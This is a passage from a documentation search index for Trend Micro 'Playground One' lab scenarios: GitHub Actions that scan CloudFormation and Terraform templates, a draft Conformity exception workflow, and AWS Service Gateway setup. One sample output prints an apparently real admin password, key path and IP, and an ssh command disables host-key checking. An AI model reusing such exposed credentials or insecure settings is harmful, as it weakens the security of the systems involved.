action if the findings threshold has been exceeded.</li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#fork-the-scenario-repo","title":"Fork the Scenario Repo","text":"<p>The first step is to fork the scenarios GitHub repo. For this go to github.com and sign in or create a free account if you need to.</p> <p>Next, you want to create a Fork of the scenarios repo. A fork is basically a copy of a repository. Forking a repository allows you to freely experiment with changes without affecting the original project.</p> <p>To do this navigate to the repo playground-one-template-scanner and click on the <code>Fork</code>-button in the upper right.</p> <p>On the next screen you change the name to something shorter like <code>action</code>. Then press <code>[Create fork]</code> which will bring you back to your account.</p>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#the-repo","title":"The Repo","text":"<p>The repo containes a hidden directory <code>.github/workflows</code> with some <code>yaml</code>-files, a <code>cfn</code> and an <code>infra</code>-directory.</p> <p>The <code>cfn</code> holds an example CloudFormation template for the scan, whereby the <code>infra</code> directory contains some Terraform modules which would create a VPC, subnets, security groups, etc.</p>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#the-workflow","title":"The Workflow","text":"<p>In the following section we'll review the different GitHub Actions for CloudFormation scanning of this repo.</p> <p>Let's go through it.</p> <pre><code>name: CloudFormation Scan\n\n# A push --tags on the repo triggers the workflow\non:\n  push:\n    tags: [ v* ]\n\nenv:\n  # Vision One API Key\n  API_KEY: ${{ secrets.API_KEY }}\n\n  # Region in which Vision One serves your organisation\n  REGION: \"\"  # Examples: \"eu.\" \"sg.\" Leave blank if running in us.\n\n  # Scan result threshold (fail on risk-level or higher)\n  # THRESHOLD: any\n  # THRESHOLD: critical\n  THRESHOLD: high\n  # THRESHOLD: medium\n  # THRESHOLD: low\n\njobs:\n  docker:\n    runs-on: ubuntu-latest\n\n    steps:\n      # Prepare and authenticate to AWS using the given credentials\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: ${{ secrets.AWS_REGION }}\n\n      # CloudFormation scan\n      - name: CloudFormation Scan\n        run: |\n          contents=$(cat cfn/template.json | jq '.' -MRs)\n          payload=\"{\\\"type\\\":\\\"cloudformation-template\\\",\\\"content\\\":${contents}}\"\n          printf '%s' ${payload} &gt; data.txt\n\n          # # Scan template\n          curl -s -X POST \\\n              -H \"Authorization: Bearer ${API_KEY}\" \\\n              -H \"Content-Type: application/json;charset=utf-8\" \\\n              https://api.${REGION}xdr.trendmicro.com/beta/cloudPosture/scanTemplate \\\n              -d @data.txt &gt; result.json\n\n          # Extract findings risk-level\n          risk_levels=$(cat result.json | jq -r '.scanResults[] | select(.status == \"FAILURE\") | .riskLevel')\n\n          fail=0\n          [ \"${THRESHOLD}\" = \"any\" ] &amp;&amp; \\\n            [ ! -z \"${risk_levels}\" ] &amp;&amp; fail=1\n\n          [ \"${THRESHOLD}\" = \"critical\" ] &amp;&amp; \\\n            [[ ${risk_levels} == *CRITICAL* ]] &amp;&amp; fail=2\n\n          [ \"${THRESHOLD}\" = \"high\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]]) &amp;&amp; fail=3\n\n          [ \"${THRESHOLD}\" = \"medium\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]]) &amp;&amp; fail=4\n\n          [ \"${THRESHOLD}\" = \"low\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]] || [[ ${risk_levels} == *LOW* ]]) &amp;&amp; fail=5\n\n          [ $fail -ne 0 ] &amp;&amp; echo !!! Threshold exceeded !!! &gt; exceeded || true\n          # rm -f data.txt\n\n      # Upload Scan Result if available\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: scan-result\n          path: result.json\n          retention-days: 30\n\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: data\n          path: data.txt\n          retention-days: 30\n\n      # Fail the workflow if theshold reached\n      - name: Fail Scan\n        run: |\n          ls -l\n          if [ -f \"exceeded\" ]; then exit 1; fi\n</code></pre>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#secrets","title":"Secrets","text":"<p>For simplicity, authentication to AWS is done via access and secret access key. Alternative and likely better variants are described here.</p> <p>The workflow requires a secret to be set. For that navigate to <code>Settings --&gt; Security --&gt; Secrets and variables --&gt; Actions --&gt; Secrets</code>.</p> <p>Add the following secrets:</p> <ul> <li>API_KEY: <code>&lt;Your Cloud One API Key&gt;</code></li> <li>AWS_ACCESS_KEY_ID</li> <li>AWS_SECRET_ACCESS_KEY</li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#template","title":"Template","text":"<p>Adapt the environment variables in the <code>env:</code>-section as required.</p> Variable Purpose <code>REGION</code> Vision One Region of choice (e.g. \"eu.\" \"sg.\" Leave blank if running in us). <code>THRESHOLD</code> Defines the fail condition of the action in relation to discovered vulnerabilities. A threshold of <code>critical</code> does allow any number of vulnerabilities up to the criticality <code>high</code>. <p>Allowed values for the <code>THRESHOLD</code> are:</p> <ul> <li><code>any</code>: No vulnerabilities allowed.</li> <li><code>critical</code>: Max risk-level of discovered findings is <code>high</code>.</li> <li><code>high</code>: Max risk-level of discovered findings is <code>medium</code>.</li> <li><code>medium</code>: Max risk-level of discovered findings is <code>low</code>.</li> <li><code>low</code>: Max risk-level of discovered findings is <code>negligible</code>.</li> </ul> <p>If the <code>THRESHOLD</code> is not set, vulnerabilities will not fail the pipeline.</p> <p>The workflow will trigger on <code>git push --tags</code>.</p>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#actions","title":"Actions","text":"<p>Navigate to <code>Actions</code> and enable Workflows for the forked repository.</p>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#test-it","title":"Test it","text":""},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#create-a-tag","title":"Create a Tag","text":"<p>To trigger the action we simply create a tag.</p> <p>Navigate to <code>Releases</code> on the right and then click on <code>[Create a new release]</code>.</p> <p>Next, click on <code>[Choose a tag]</code> and type <code>v0.1</code>. A new button called <code>[Create new tag]</code> should get visible. Click on it.</p> <p>Leave the rest as it is and finally click on the green button <code>[Publish release]</code>. This will trigger the action workflow.</p> <p>CLI: <code>git tag v0.1 &amp;&amp; git push --tags</code></p>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#check-the-action","title":"Check the Action","text":"<p>Now, navigate to the tab <code>Actions</code> and review the actions output. Click on <code>CloudFormation Scan</code>.</p> <p>You should now see three main sections:</p> <ol> <li><code>cloudformation-template-scan-shell.yaml</code>: Clicking on <code>docker</code> reveals the output of the steps from the workflow (and where it failed).</li> <li>Annotations: Telling you in this case that the process completed with exit code 1.</li> <li>Artifacts: These are the artifacts created by the action. There should be a <code>scan-result</code>.</li> </ol> <p>Feel free to review the scan results to find out why the action did fail.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/asrm/pm/template-scanning-exception-handling/","title":"Scenario: Terraform IaC Scanning in Pipelines with Exception Handling","text":"<p>DRAFT</p> <p>Warning!</p> <p>This scenario does use Cloud One Conformity! The current Vision One Cloud Posture API doesn't support setting a scan profile yet. When this functionality is getting available this scenario will be updated.</p>"},{"location":"scenarios/asrm/pm/template-scanning-exception-handling/#prerequisites","title":"Prerequisites","text":"<ul> <li>Clouud One API-Key with the following permissions:<ul> <li>Conformity<ul> <li>Full-Access</li> </ul> </li> </ul> </li> </ul> <p>The provided Python scripts implement the required functionality for Terraform Template Scanning, Exception approval workflows and temporary suppression of findings in Conformity Account Profile. It mainly focuses on the logic to support these kind of scenarios and cannot be used 1-to-1 in real life pipelines without modifications. The implementation assumes that an external workflow engine such as ServiceNow is used for approval workflows, which include an expiration set on the specific exception.</p> <p>Conformity offers two different variants to \u201callow\u201d non-compliance:</p> <ul> <li>Exceptions in rule configuration based on Tags or Resource ID (AWS ARN)</li> <li>Suppressions on specific findings</li> </ul> <p>The required functionality as part of the workflow requirements is available via Conformity's REST API in combination with ServiceNow for workflow management.</p> <p>Logical architecture:</p> <p></p> <p>The idea is to create one or more Scan Profiles with are used by the template scanner. The Scan Profile gets Exceptions assigned so that a template scan result can pass before deployment.</p> <p></p> <p>In the above screenshot we have two Scan Profiles with different settings.</p> <p>Scan Profile contains</p> <ul> <li>Rule Settings and</li> <li>approved Exceptions</li> </ul> <p>Suppressions are set in Account to (temporarily) suppress but report Findings. When Suppression(s) expire, Exceptions in Scan Profile are to be adapted/removed.</p> <p>The onboarding workflow:</p> <p></p> <p>The next graph shows the complete workflow implemented in this scenario:</p> <p></p> <p>Things to be aware of:</p> <ul> <li>Resource IDs (e.g. ARNs) are often unknown at Terraform Plan stage</li> <li>Name-Tags might not be granular enough in regards Suppressions</li> <li>Tags on resources may be set incorrectly, possibly intentionally</li> <li>Resolution idea (partly implemented):<ul> <li>Trigger Template Scan</li> <li>Findings trigger Exemption Workflow</li> <li>Approved Exceptions get a unique ID assigned which is bound to the Resource and Rule ID</li> <li>Allowed non-compliant resources are tagged in the Terraform Template with this unique ID</li> <li>Allows validation before deployment (does the tag match to the resource and Rule ID?)</li> </ul> </li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-exception-handling/#playing-through-the-workflow","title":"Playing through the Workflow","text":"<p>The scenarios offer two different terraform configurations that you can play with for convenience. Effectively it is not limitted to these, the Python script can scan any configuration, even the Playground One configurations of <code>awsone</code>.</p> <p>There are two variants implemented which differ in their approach to identity AWS resources to build:</p> <ul> <li><code>scanner_c1_name.py</code>: Simply uses name tags on the resources.</li> <li><code>scanner_c1_uuid.py</code>: Automatically creates an unique <code>uuid</code>-tag for the resources which need to be assigned manually to the resource before deployment to be compliant.</li> </ul> <p>The scripts are located in the <code>cspm</code>-directory and assume, that all exeption are granted and expire after seven days.</p>"},{"location":"scenarios/asrm/pm/template-scanning-exception-handling/#prepare","title":"Prepare","text":"<ul> <li>Set environment variable C1CSPM_SCANNER_KEY with the API key of the   Conformity Scanner owning Full Access to Conformity.</li> <li>Adapt the constants in the Python script in between <code># HERE</code> and <code># /HERE</code> to your requirements.</li> <li> <p>Lines 106ff.    <pre><code># HERE\nREGION = \"trend-us-1\"\nSCAN_PROFILE_ID = \"&lt;Scan Profile ID&gt;\"\nACCOUNT_ID = \"&lt;Conformity AWS Account ID&gt;\"\nSCAN_PROFILE_NAME = \"&lt;Scan Profile Name&gt;\"\nREPORT_TITLE = \"Workflow Tests\"\nRISK_LEVEL_FAIL = \"MEDIUM\"\n# /HERE\n</code></pre></p> </li> <li> <p>Get your <code>ACCOUNT_ID</code>:</p> <p><pre><code>curl --location 'https://conformity.trend-us-1.cloudone.trendmicro.com/api/accounts' \\\n    --header 'Content-Type: application/vnd.api+json' \\\n    --header 'Authorization: ApiKey &lt;YOUR API KEY&gt;'\n</code></pre>   - Get the <code>SCAN_PROFILE_ID</code> and <code>SCAN_PROFILE_NAME</code>:</p> <pre><code>curl --location 'https://conformity.trend-us-1.cloudone.trendmicro.com/api/profiles' \\\n--header 'Content-Type: application/vnd.api+json' \\\n--header 'Authorization: ApiKey &lt;YOUR API KEY&gt;'\n</code></pre> </li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-exception-handling/#using-name-tags","title":"Using Name-Tags","text":"<p>First, we're going the easy route using name tags.</p> <p>Here's the quick run-through:</p> <pre><code># Run template scan\n$ ./scanner_c1_name.py --scan 2-network\n\n# Run approval workflows in engine, here implementing the approved workflow\n$ ./scanner_c1_name.py --exclude 2-network\n\n# Run template scan again to verify that the scan result is clean\n$ ./scanner_c1_name.py --scan 2-network\n\n# Apply configuration\n$ ./scanner_c1_name.py --apply 2-network\n\n# Trigger bot run\n$ ./scanner_c1_name.py --bot\n\n# Suppress findings\n$ ./scanner_c1_name.py --suppress\n\n# Suppressions are active for 1 week\n$ ./scanner_c1_name.py --expire\n\n# Wait for suppressions to expire\n$ ./scanner_c1_name.py --expire\n\n# Cleanup\n$ ./scanner_c1_name.py --destroy 2-network\n$ ./scanner_c1_name.py --reset\n$ ./scanner_c1_name.py --expire\n</code></pre> <p>To be continued...</p>"},{"location":"scenarios/asrm/pm/template-scanning-exception-handling/#using-uuid-tags","title":"Using UUID-Tags","text":"<pre><code># Run template scan\n$ ./scanner_c1_uuid.py --scan 2-network\n\n# Run approval workflows in engine, here implementing the approved workflow\n$ ./scanner_c1_uuid.py --exclude 2-network\n\n# Now add the exclusion tags to the corresponding resources\n# in the Terraform template\n\n# Run template scan again to verify that the scan result is clean\n$ ./scanner_c1_uuid.py --scan 2-network\n\n# Apply configuration\n$ ./scanner_c1_uuid.py --apply 2-network\n\n# Trigger bot run\n$ ./scanner_c1_uuid.py --bot\n\n# Suppress findings\n$ ./scanner_c1_uuid.py --suppress\n\n# Suppressions are active for 1 week\n$ ./scanner_c1_uuid.py --expire\n\n# Wait for suppressions to expire\n$ ./scanner_c1_uuid.py --expire\n\n# Cleanup\n$ ./scanner_c1_uuid.py --destroy 2-network\n$ ./scanner_c1_uuid.py --reset\n$ ./scanner_c1_uuid.py --expire\n</code></pre> <p>For each exception set the script genarates a unique tag which needs to be assigned to the resource definition within the Terraform configuration.</p> <pre><code>locals {\n  security_groups = {\n    public = {\n      name        = \"${var.environment}-public-sg\"\n      description = \"Security group for Public Access\"\n      tags = {\n        \"39c34a53-7368-40ba-b96b-254877a7d8a5\" = \"module.ec2.aws_security_group.sg[\\\"public\\\"]_EC2-001\"\n        \"bf8d1c3f-a6bb-40af-b0e9-6b8820bcf397\" = \"module.ec2.aws_security_group.sg[\\\"public\\\"]_EC2-033\"\n      }\n      ingress = {\n...\n    private = {\n      name        = \"${var.environment}-private-sg\"\n      description = \"Security group for Private Access\"\n      tags = {\n        \"d2c3b1ee-8278-4b8c-9adb-e82fd5bb79c0\" = \"module.ec2.aws_security_group.sg[\\\"private\\\"]_EC2-033\"\n      }\n      ingress = {\n...\n</code></pre> <p>This allows to validate, that the unique tag key is assigned to the designated resource and violating rule only.</p> <p>To be continued...</p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/","title":"Scenario: Terraform IaC Scanning as GitHub Action","text":""},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One API-Key with the following permissions:<ul> <li>Cloud Posture<ul> <li>View</li> </ul> </li> </ul> </li> <li>GitHub Account.</li> <li>Forked playground-one-template-scanner.</li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#about-github-actions","title":"About GitHub Actions","text":"<p>GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline on GitHub.</p> <p>GitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.</p> <p>You can configure a GitHub Actions workflow to be triggered when an event occurs in your repository, such as a pull request being opened, an issue being created or a push happened. Your workflow contains one or more jobs which can run in sequential order or in parallel. Each job will run inside its own virtual machine runner, or inside a container, and has one or more steps that either run a script that you define or run an action, which is a reusable extension that can simplify your workflow.</p> <p>Workflows are defined as YAML files in the .github/workflows directory in a repository, and a repository can have multiple workflows, each of which can perform a different set of tasks.</p> <p>In this scenario we're going to create a workflow to automatically scan a Terraform configuration with Vision One Cloud Posture Template Scanning. The scan will check the configuration for misconfigurations.</p> <p>The logic implemented in this Action template is as follows:</p> <ul> <li>Prepare the Terraform environment.</li> <li>Compute a plan for the Terraform configuration.</li> <li>Use the template scanner to scan for misconfigurations.</li> <li>Upload scan artifacts.</li> <li>Eventually fail the action if the findings threshold has been exceeded.</li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#fork-the-scenario-repo","title":"Fork the Scenario Repo","text":"<p>The first step is to fork the scenarios GitHub repo. For this go to github.com and sign in or create a free account if you need to.</p> <p>Next, you want to create a Fork of the scenarios repo. A fork is basically a copy of a repository. Forking a repository allows you to freely experiment with changes without affecting the original project.</p> <p>To do this navigate to the repo playground-one-template-scanner and click on the <code>Fork</code>-button in the upper right.</p> <p>On the next screen you change the name to something shorter like <code>action</code>. Then press <code>[Create fork]</code> which will bring you back to your account.</p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#the-repo","title":"The Repo","text":"<p>The repo containes a hidden directory <code>.github/workflows</code> with some <code>yaml</code>-files, a <code>cfn</code> and an <code>infra</code>-directory.</p> <p>The <code>cfn</code> holds an example CloudFormation template for the scan, whereby the <code>infra</code> directory contains some Terraform modules which would create a VPC, subnets, security groups, etc.</p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#the-workflows","title":"The Workflows","text":"<p>In the following section we'll review the different GitHub Actions of this repo.</p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#terraform-scan-using-shell","title":"Terraform Scan using Shell","text":"<p>The <code>terraform-template-scan-shell.yaml</code>-file in <code>.github/workflows</code> will run a scan on the provided Terraform infrastructure.</p> <p>Important to understand is, that the scan will actually scan the Terraform plan which is effectively the execution plan Terraform would do when the configuration would be applied. It therefore requires valid authentication credentials to the cloud and will only contain the actions to match the desired state as defined in the configuration.</p> <p>By default, when Terraform creates a plan it:</p> <ul> <li>Reads the current state of any already-existing remote objects to make sure that the Terraform state is up-to-date.</li> <li>Compares the current configuration to the prior state and noting any differences.</li> <li>Proposes a set of change actions that should, if applied, make the remote objects match the configuration.</li> </ul> <p>The plan command alone does not actually carry out the proposed changes, but the plan is what is scanned by Conformity.</p> <p>Let's go through it.</p> <pre><code>name: Terraform Scan Shell\n\n# A push --tags on the repo triggers the workflow\non:\n  push:\n    tags: [ v* ]\n\nenv:\n  # Vision One API Key\n  API_KEY: ${{ secrets.API_KEY }}\n\n  # Region in which Vision One serves your organisation\n  REGION: \"\"  # Examples: \"eu.\" \"sg.\" Leave blank if running in us.\n\n  # Scan result threshold (fail on risk-level or higher)\n  # THRESHOLD: any\n  # THRESHOLD: critical\n  THRESHOLD: high\n  # THRESHOLD: medium\n  # THRESHOLD: low\n\njobs:\n  docker:\n    runs-on: ubuntu-latest\n\n    steps:\n      # Prepare and authenticate to AWS using the given credentials\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: ${{ secrets.AWS_REGION }}\n\n      # Install Terraform\n      - name: Terraform Install\n        run: |\n          wget -O- https://apt.releases.hashicorp.com/gpg | \\\n            gpg --dearmor | \\\n            sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg &gt; /dev/null\n          echo \"deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \\\n            https://apt.releases.hashicorp.com $(lsb_release -cs) main\" | \\\n            sudo tee /etc/apt/sources.list.d/hashicorp.list\n          sudo apt-get update\n          sudo apt-get install -y terraform\n\n      # Terraform plan\n      - name: Terraform Plan\n        run: |\n          # IaC code in\n          iac=infra\n\n          # Create template\n          cd ${iac}\n          terraform init\n          terraform plan -var=\"account_id=${{ secrets.AWS_ACCOUNT_ID }}\" -var=\"aws_region=${{ secrets.AWS_REGION }}\" -out=plan.out\n          terraform show -json plan.out &gt; ../plan.json\n          rm -f plan.out\n          cd ..\n\n      # Terraform scan\n      - name: Terraform Scan\n        run: |\n          # Create scan payload\n          contents=$(cat plan.json | jq '.' -MRs)\n          payload=\"{\\\"type\\\":\\\"terraform-template\\\",\\\"content\\\":${contents}}\"\n          printf '%s' ${payload} &gt; data.txt\n\n          # Scan template\n          curl -s -X POST \\\n              -H \"Authorization: Bearer ${API_KEY}\" \\\n              -H \"Content-Type: application/json;charset=utf-8\" \\\n              https://api.${REGION}xdr.trendmicro.com/beta/cloudPosture/scanTemplate \\\n              -d @data.txt &gt; result.json\n\n          # Extract findings risk-level\n          risk_levels=$(cat result.json | jq -r '.scanResults[] | select(.status == \"FAILURE\") | .riskLevel')\n\n          fail=0\n          [ \"${THRESHOLD}\" = \"any\" ] &amp;&amp; \\\n            [ ! -z \"${risk_levels}\" ] &amp;&amp; fail=1\n\n          [ \"${THRESHOLD}\" = \"critical\" ] &amp;&amp; \\\n            [[ ${risk_levels} == *CRITICAL* ]] &amp;&amp; fail=2\n\n          [ \"${THRESHOLD}\" = \"high\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]]) &amp;&amp; fail=3\n\n          [ \"${THRESHOLD}\" = \"medium\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]]) &amp;&amp; fail=4\n\n          [ \"${THRESHOLD}\" = \"low\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]] || [[ ${risk_levels} == *LOW* ]]) &amp;&amp; fail=5\n\n          [ $fail -ne 0 ] &amp;&amp; echo !!! Threshold exceeded !!! &gt; exceeded || true\n          # rm -f data.txt plan.json\n\n      # Upload Scan Result if available\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: scan-result\n          path: result.json\n          retention-days: 30\n\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: data\n          path: data.txt\n          retention-days: 30\n\n      # Fail the workflow if theshold reached\n      - name: Fail Scan\n        run: |\n          ls -l\n          if [ -f \"exceeded\" ]; then exit 1; fi\n</code></pre>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#terraform-scan-using-terraform-plan-action","title":"Terraform Scan using Terraform plan action","text":"<p>This workflow is a variant of the above, simplifying the Terraform install and plan steps. All the rest is identical.</p> <pre><code>...\njobs:\n  docker:\n    runs-on: ubuntu-latest\n\n    steps:\n...\n      # Terraform plan\n      - name: Terraform Plan\n        id: terraform_plan\n        uses: dflook/terraform-plan@v1\n        with:\n          path: infra\n          variables: |\n            account_id=\"${{ secrets.AWS_ACCOUNT_ID }}\"\n            aws_region=\"${{ secrets.AWS_REGION }}\"\n\n      # Terraform scan\n      - name: Terraform Scan\n        run: |\n          # Create scan payload\n          contents=$(cat ${{ steps.terraform_plan.outputs.json_plan_path }} | jq '.' -MRs)\n          payload=\"{\\\"type\\\":\\\"terraform-template\\\",\\\"content\\\":${contents}}\"\n          printf '%s' ${payload} &gt; data.txt\n...\n</code></pre> <p>The <code>Terraform Plan</code> step replaces the install and plan steps by using the plan action from Daniel Flook.</p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#secrets","title":"Secrets","text":"<p>For simplicity, authentication to AWS is done via access and secret access key. Alternative and likely better variants are described here.</p> <p>The workflow requires a secret to be set. For that navigate to <code>Settings --&gt; Security --&gt; Secrets and variables --&gt; Actions --&gt; Secrets</code>.</p> <p>Add the following secrets:</p> <ul> <li>API_KEY: <code>&lt;Your Cloud One API Key&gt;</code></li> <li>AWS_ACCESS_KEY_ID</li> <li>AWS_SECRET_ACCESS_KEY</li> </ul> <p>The included terraform configuration requires additionally:</p> <ul> <li>AWS_REGION</li> <li>AWS_ACCOUNT_ID</li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#template","title":"Template","text":"<p>Adapt the environment variables in the <code>env:</code>-section as required.</p> Variable Purpose <code>REGION</code> Vision One Region of choice (e.g. \"eu.\" \"sg.\" Leave blank if running in us). <code>THRESHOLD</code> Defines the fail condition of the action in relation to discovered vulnerabilities. A threshold of <code>critical</code> does allow any number of vulnerabilities up to the criticality <code>high</code>. <p>Allowed values for the <code>THRESHOLD</code> are:</p> <ul> <li><code>any</code>: No vulnerabilities allowed.</li> <li><code>critical</code>: Max risk-level of discovered findings is <code>high</code>.</li> <li><code>high</code>: Max risk-level of discovered findings is <code>medium</code>.</li> <li><code>medium</code>: Max risk-level of discovered findings is <code>low</code>.</li> <li><code>low</code>: Max risk-level of discovered findings is <code>negligible</code>.</li> </ul> <p>If the <code>THRESHOLD</code> is not set, vulnerabilities will not fail the pipeline.</p> <p>The workflow will trigger on <code>git push --tags</code>.</p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#actions","title":"Actions","text":"<p>Navigate to <code>Actions</code> and enable Workflows for the forked repository.</p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#test-it","title":"Test it","text":""},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#create-a-tag","title":"Create a Tag","text":"<p>To trigger the action we simply create a tag.</p> <p>Navigate to <code>Releases</code> on the right and then click on <code>[Draft a new release]</code>.</p> <p>Next, click on <code>[Choose a tag]</code> and type <code>v0.1</code>. A new button called <code>[Create new tag]</code> should get visible. Click on it.</p> <p>Leave the rest as it is and finally click on the green button <code>[Publish release]</code>. This will trigger the action workflow.</p> <p>CLI: <code>git tag v0.1 &amp;&amp; git push --tags</code></p>"},{"location":"scenarios/asrm/pm/template-scanning-terraform-github-action/#check-the-action","title":"Check the Action","text":"<p>Now, navigate to the tab <code>Actions</code> and review the actions output. Click on <code>Terraform Scan Shell</code> or <code>Terraform Scan TfAction</code>.</p> <p>You should now see three main sections:</p> <ol> <li><code>terraform-template-scan-shell.yaml</code> or <code>terraform-template-scan-tfaction.yaml</code>: Clicking on <code>docker</code> reveals the output of the steps from the workflow (and where it failed).</li> <li>Annotations: Telling you in this case that the process completed with exit code 1.</li> <li>Artifacts: These are the artifacts created by the action. There should be a <code>scan-result</code>.</li> </ol> <p>Feel free to review the scan results to find out why the action did fail.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-automatically/","title":"Scenario: Deploy Vision One Service Gateway on AWS Automatically","text":""},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-automatically/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> <li>Activated Marketplace AMI for Trend Service Gateway BYOL</li> </ul> <p>You need to have activated the Trend Service Gateway BYOL AMI in Marketplace once. To do this, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Service Gateway</code>.</p> <p></p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe on instance launch]</code>. </p> <p></p> <p>Now, check your Playground One configuration.</p> <p>Verify, that you have <code>AWS SG - create Service Gateway</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nAWS SG - create Service Gateway [true]:\n...\n</code></pre> <pre><code># With SG enabled\npgo --apply network\n</code></pre> <p>The Service Gateway gets a dedicated AWS Security Group assigned which allows SSH from your configured access IP(s) only. All other ports are only accessible from within the public and private subnets.</p>"},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-automatically/#get-the-vision-one-api-key","title":"Get the Vision One API Key","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and click on <code>[Download Virtual Appliance]</code>.</p> <p></p> <p>In this scenario, you do not need to download the virtual appliance as we will be using an AWS Marketplace AMI. Simply copy the registration token shown at the bottom right and save it in a safe place.</p> <p></p>"},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-automatically/#activate-the-service-gateway","title":"Activate the Service Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\"\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting value here is <code>sg_va_ssh</code>. Run the given command to connect to the Service Gateway.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\n</code></pre> <p></p> <pre><code>enable\n\nregister &lt;your API Token from the first step&gt;\n</code></pre> <p>It can take some time for the Service Gateway to show up in the console.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-manually/","title":"Scenario: Deploy Vision One Service Gateway on AWS Manually","text":""},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-manually/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> </ul> <pre><code>pgo --apply network\n</code></pre>"},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-manually/#get-the-vision-one-api-key","title":"Get the Vision One API Key","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and click on <code>[Download Virtual Appliance]</code>.</p> <p></p> <p>In this scenario, you do not need to download the virtual appliance as we will be using an AWS Marketplace AMI. Simply copy the registration token shown at the bottom right and save it in a safe place.</p> <p></p>"},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-manually/#launch-instance-on-aws","title":"Launch Instance on AWS","text":"<p>Now, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Service 